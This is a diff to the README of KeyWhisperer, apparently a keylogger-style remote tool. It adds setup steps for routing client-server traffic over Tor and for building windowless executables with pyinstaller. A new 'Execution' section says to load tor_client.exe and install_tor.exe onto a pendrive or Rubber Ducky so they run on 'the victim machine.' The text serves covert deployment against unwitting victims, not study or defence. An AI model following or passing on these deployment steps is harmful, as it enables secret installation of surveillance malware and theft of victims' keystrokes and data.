@@ -135,7 +135,8 @@ pyinstaller --onefile --noconsole --icon=icon.ico install_tor.py
 <br><br><br>
 
 ## TOR Client Script
-You will have to use this [tor_client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/tor_client.py) instead of the [client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/client.py) we used before, if you want to enable the commnication of server and client via tor network.
+You will have to use this [tor_client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/tor_client.py) instead of the [client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/client.py) we used before, if you want to enable the commnication of server and client via tor network.<br>
+Replace the 'ONION_ADDRESS' in the script with the onion address you noted in the previous step.<br>
 Run the following command to convert your [tor_client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/install_tor.py) into a standalone executable:
 ```
 pyinstaller --onefile --noconsole --icon=icon.ico tor_client.py
@@ -143,8 +144,11 @@ pyinstaller --onefile --noconsole --icon=icon.ico tor_client.py
 **Note:** You can keep using the same server script even for communication via tor.
 <br><br><br>
 
+## Execution
+You will have to replace the client.exe with the tor_client.exe, and also add the install_tor.exe in your pendrive or Rubber Ducky (whichever you are using) which will be executed on the victim machine.
+
 ## Bugs, Issues and Contributing
-If you find bugs or have suggestions about improving the module, don't hesitate to contact me.
+If you find bugs or have suggestions about improving KeyWhisperer, don't hesitate to contact me.
 <br><br><br>
 
 ## License
